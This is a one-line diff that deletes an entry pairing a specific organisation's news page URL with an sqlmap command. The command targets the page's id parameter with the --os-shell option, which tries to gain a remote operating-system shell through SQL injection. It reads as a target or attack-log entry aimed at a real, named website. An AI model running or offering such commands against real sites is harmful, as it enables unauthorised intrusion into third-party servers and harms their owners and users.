@@ -1,1 +1,0 @@
-https://csi-india.org/news/index.php?id=18 (GET)  # sqlmap.py -u https://csi-india.org/news/index.php?id=18 --batch --os-shell
